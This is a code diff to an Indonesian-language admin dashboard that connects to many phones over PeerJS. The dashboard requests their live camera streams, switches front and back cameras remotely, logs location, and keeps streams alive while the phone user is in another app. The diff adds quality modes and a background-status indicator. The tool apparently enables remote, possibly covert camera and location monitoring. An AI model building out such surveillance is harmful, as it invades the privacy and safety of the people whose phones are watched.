@@ -20,6 +20,7 @@
     button {
       border: none; border-radius: 8px; padding: 9px 13px;
       font-size: 12px; font-weight: 600; cursor: pointer; color: #FFFFFF;
+      transition: background 0.15s ease;
     }
     .btn-blue { background: #118EE9; }
     .btn-blue:hover { background: #0D7CD0; }
@@ -31,7 +32,7 @@
 
     .grid-devices {
       display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(290px, 1fr));
+      grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
       gap: 14px;
     }
     .device-card {
@@ -50,13 +51,19 @@
       display: flex;
       align-items: center;
       justify-content: center;
+      overflow: hidden;
     }
     .video-wrap video {
       width: 100%;
       height: 100%;
       object-fit: cover;
+      transform: translateZ(0);
+      backface-visibility: hidden;
+      will-change: transform;
     }
     .video-placeholder {
+      position: relative;
+      z-index: 2;
       font-size: 12px;
       color: #64748B;
       text-align: center;
@@ -65,6 +72,7 @@
     .chip-row {
       position: absolute;
       top: 8px; left: 8px; right: 8px;
+      z-index: 3;
       display: flex; justify-content: space-between; gap: 6px;
       pointer-events: none;
     }
@@ -106,6 +114,8 @@
         <button class="btn-blue" onclick="connectAllDevices()">▶ Hubungkan Semua HP</button>
         <button class="btn-indigo" onclick="switchAllCameras('user')">🤳 Semua Depan</button>
         <button class="btn-indigo" onclick="switchAllCameras('environment')">📷 Semua Belakang</button>
+        <button class="btn-slate" onclick="setAllQuality('hd')">✨ Mode Jelas (HD)</button>
+        <button class="btn-slate" onclick="setAllQuality('smooth')">⚡ Mode Anti-Lag</button>
         <button class="btn-slate" onclick="pingAllDevices()">🔄 Refresh Status</button>
       </div>
     </div>
@@ -119,7 +129,7 @@
 
   <script>
     const ADMIN_LOBBY_ID = "jirun-admin-lobby-9988";
-    const BACKGROUND_GRACE_MS = 25000; // Masa tunggu saat pindah ke app lain (mis. TikTok)
+    const BACKGROUND_GRACE_MS = 30000;
 
     let peer = null;
     const devices = {};
@@ -142,7 +152,7 @@
         syncDeviceCard(id);
 
         conn.on("open", () => {
-          conn.send({ type: "REQUEST_STREAM" });
+          conn.send({ type: "REQUEST_STREAM", quality: entry.quality || "hd" });
         });
 
         conn.on("data", (msg) => {
@@ -159,6 +169,7 @@
 
           if (msg.type === "HP_PRESENCE") {
             entry.closedExplicitly = false;
+            entry.inBackground = Boolean(msg.inBackground);
             entry.facing = msg.facing || entry.facing || "Depan";
             entry.cameraOn = msg.cameraOn !== undefined ? Boolean(msg.cameraOn) : true;
             entry.location = msg.location || entry.location;
@@ -197,7 +208,6 @@
         });
         call.on("close", () => {
           entry.call = null;
-          // Jangan langsung hapus stream jika masih dalam masa tunggu pindah aplikasi
           syncDeviceCard(id);
         });
       });
@@ -213,8 +223,10 @@
           peerId: id,
           facing: "Depan",
           cameraOn: true,
+          inBackground: false,
           location: null,
           device: "",
+          quality: "hd",
           updatedAt: Date.now(),
           connected: true,
           closedExplicitly: false,
@@ -230,7 +242,7 @@
       const entry = devices[id];
       if (!entry || !peer || peer.destroyed) return;
       if (entry.conn && entry.conn.open) {
-        entry.conn.send({ type: "REQUEST_STREAM" });
+        entry.conn.send({ type: "REQUEST_STREAM", quality: entry.quality || "hd" });
       }
     }
 
@@ -243,13 +255,31 @@
     function switchDeviceCamera(id, facing) {
       const entry = devices[id];
       if (entry && entry.conn && entry.conn.open) {
-        entry.conn.send({ type: "SWITCH_CAM", facing });
+        entry.facing = facing === "environment" ? "Belakang" : "Depan";
+        entry.conn.send({ type: "SWITCH_CAM", facing, quality: entry.quality || "hd" });
+        syncDeviceCard(id);
       }
     }
 
     function switchAllCameras(facing) {
       for (const id of Object.keys(devices)) {
         switchDeviceCamera(id, facing);
+      }
+    }
+
+    function setDeviceQuality(id, quality) {
+      const entry = devices[id];
+      if (!entry) return;
+      entry.quality = quality;
+      if (entry.conn && entry.conn.open) {
+        entry.conn.send({ type: "SET_QUALITY", quality });
+      }
+      syncDeviceCard(id);
+    }
+
+    function setAllQuality(quality) {
+      for (const id of Object.keys(devices)) {
+        setDeviceQuality(id, quality);
       }
     }
 
@@ -267,7 +297,7 @@
       const ph = document.getElementById(`ph_${id}`);
       if (!vid || !ph) return;
 
-      if (stream) {
+      if (stream && stream.active) {
         if (vid.srcObject !== stream) {
           vid.srcObject = stream;
         }
@@ -276,7 +306,7 @@
         if (vid.paused) {
           vid.play().catch(() => {});
         }
-      } else {
+      } else if (!stream) {
         vid.srcObject = null;
         vid.style.display = "none";
         ph.style.display = "block";
@@ -299,7 +329,7 @@
         <div class="video-wrap">
           <div class="chip-row">
             <span class="chip" id="status_${safeId}">Menunggu</span>
-            <span class="chip">${escapeHtml(d.peerId.slice(-6))}</span>
+            <span class="chip" id="qchip_${safeId}">HD</span>
           </div>
           <video id="vid_${safeId}" autoplay playsinline muted style="display:none;"></video>
           <div id="ph_${safeId}" class="video-placeholder">
@@ -313,6 +343,8 @@
           <div class="card-actions" id="act_${safeId}">
             <button class="btn-indigo btn-sm" onclick="switchDeviceCamera('${safeId}', 'user')">Depan</button>
             <button class="btn-indigo btn-sm" onclick="switchDeviceCamera('${safeId}', 'environment')">Belakang</button>
+            <button class="btn-slate btn-sm" onclick="setDeviceQuality('${safeId}', 'hd')">HD</button>
+            <button class="btn-slate btn-sm" onclick="setDeviceQuality('${safeId}', 'smooth')">Smooth</button>
             <button class="btn-blue btn-sm" onclick="requestStreamFromDevice('${safeId}')">Stream</button>
           </div>
         </div>
@@ -340,7 +372,12 @@
       const hasLiveStream = Boolean(d.stream && d.stream.active);
 
       const statusChip = document.getElementById(`status_${id}`);
+      const qChip = document.getElementById(`qchip_${id}`);
       const ph = document.getElementById(`ph_${id}`);
+
+      if (qChip) {
+        qChip.textContent = (d.quality === "smooth" ? "SMOOTH" : "HD") + " • " + d.peerId.slice(-4);
+      }
 
       if (!withinGrace) {
         if (d.stream) {
@@ -352,12 +389,14 @@
           statusChip.className = "chip off";
         }
         if (ph) {
-          ph.textContent = "Kamera mati (riwayat dihapus / koneksi terputus)";
+          ph.textContent = "Kamera mati (aplikasi/halaman benar-benar di-close)";
         }
       } else if (hasLiveStream && d.connected) {
         if (statusChip) {
-          statusChip.textContent = `LIVE • ${d.facing || "Depan"}`;
-          statusChip.className = "chip live";
+          statusChip.textContent = d.inBackground
+            ? `LATAR BELAKANG • ${d.facing || "Depan"}`
+            : `LIVE • ${d.facing || "Depan"}`;
+          statusChip.className = d.inBackground ? "chip bg" : "chip live";
         }
         attachStreamToCard(id, d.stream);
       } else {
@@ -366,7 +405,7 @@
           statusChip.className = "chip bg";
         }
         if (ph && !hasLiveStream) {
-          ph.textContent = "Perangkat pindah aplikasi (menunggu stream/koneksi)...";
+          ph.textContent = "Perangkat sedang buka aplikasi lain (menjaga koneksi)...";
         }
       }
 
